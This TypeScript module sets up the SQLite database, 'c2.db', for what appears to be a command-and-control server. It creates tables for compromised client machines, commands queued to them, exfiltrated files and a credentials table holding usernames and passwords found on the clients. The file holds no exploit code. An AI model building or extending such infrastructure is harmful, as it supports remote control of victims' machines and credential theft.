import Database from 'better-sqlite3'
import path from 'path'
import fs from 'fs'

let db: Database.Database | null = null

export function getDatabase(): Database.Database {
  if (!db) {
    const dataDir = path.join(process.cwd(), '..', 'data')
    
    // Create data directory if it doesn't exist
    if (!fs.existsSync(dataDir)) {
      fs.mkdirSync(dataDir, { recursive: true })
    }

    const dbPath = path.join(dataDir, 'c2.db')
    db = new Database(dbPath)
    
    // Enable WAL mode for concurrent access
    db.pragma('journal_mode = WAL')
    // Enable foreign keys
    db.pragma('foreign_keys = ON')
    
    // Initialize schema if needed
    initializeSchema()
  }
  
  return db
}

function initializeSchema() {
  if (!db) return

  try {
    // Create all tables using IF NOT EXISTS so it's always safe
    db.exec(`
      CREATE TABLE IF NOT EXISTS clients (
        id TEXT PRIMARY KEY,
        hostname TEXT NOT NULL,
        username TEXT NOT NULL,
        os TEXT NOT NULL,
        ip_address TEXT NOT NULL,
        architecture TEXT,
        is_admin BOOLEAN DEFAULT 0,
        status TEXT DEFAULT 'online',
        gpu TEXT,
        motherboard TEXT,
        last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
        first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
      );

      CREATE TABLE IF NOT EXISTS commands (
        id TEXT PRIMARY KEY,
        client_id TEXT NOT NULL,
        command_type TEXT NOT NULL,
        command_name TEXT NOT NULL,
        parameters TEXT,
        status TEXT DEFAULT 'pending',
        result TEXT,
        error_message TEXT,
        execution_time DATETIME,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        is_active BOOLEAN DEFAULT 0,
        FOREIGN KEY (client_id) REFERENCES clients(id)
      );

      CREATE TABLE IF NOT EXISTS system_info (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        client_id TEXT NOT NULL,
        cpu_usage REAL,
        memory_usage REAL,
        memory_total REAL,
        disk_usage REAL,
        disk_total REAL,
        uptime REAL,
        network_interfaces TEXT,
        running_processes TEXT,
        network_connections TEXT,
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (client_id) REFERENCES clients(id)
      );

      CREATE TABLE IF NOT EXISTS files (
        id TEXT PRIMARY KEY,
        client_id TEXT NOT NULL,
        command_id TEXT,
        file_path TEXT NOT NULL,
        file_name TEXT NOT NULL,
        file_size INTEGER,
        file_type TEXT,
        operation TEXT,
        status TEXT DEFAULT 'pending',
        local_path TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (client_id) REFERENCES clients(id),
        FOREIGN KEY (command_id) REFERENCES commands(id)
      );

      CREATE TABLE IF NOT EXISTS sessions (
        id TEXT PRIMARY KEY,
        username TEXT NOT NULL,
        login_time DATETIME DEFAULT CURRENT_TIMESTAMP,
        last_activity DATETIME DEFAULT CURRENT_TIMESTAMP,
        ip_address TEXT,
        user_agent TEXT,
        is_active BOOLEAN DEFAULT 1
      );

      CREATE TABLE IF NOT EXISTS command_history (
        id TEXT PRIMARY KEY,
        client_id TEXT NOT NULL,
        command_type TEXT NOT NULL,
        command_name TEXT NOT NULL,
        parameters TEXT,
        result TEXT,
        executed_by TEXT,
        executed_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (client_id) REFERENCES clients(id)
      );

      CREATE TABLE IF NOT EXISTS credentials (
        id TEXT PRIMARY KEY,
        client_id TEXT NOT NULL,
        credential_type TEXT NOT NULL,
        username TEXT,
        password TEXT,
        domain TEXT,
        application TEXT,
        found_at TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (client_id) REFERENCES clients(id)
      );

      CREATE INDEX IF NOT EXISTS idx_client_id ON commands(client_id);
      CREATE INDEX IF NOT EXISTS idx_client_status ON clients(status);
      CREATE INDEX IF NOT EXISTS idx_command_status ON commands(status);
      CREATE INDEX IF NOT EXISTS idx_system_info_client ON system_info(client_id);
      CREATE INDEX IF NOT EXISTS idx_created_at ON commands(created_at);
      CREATE INDEX IF NOT EXISTS idx_timestamp ON system_info(timestamp);
    `)
    
    // console.log('[Database] Schema initialized successfully')
  } catch (error) {
    console.error('[Database] Schema initialization failed:', error)
  }
}

export function closeDatabase() {
  if (db) {
    db.close()
    db = null
  }
}
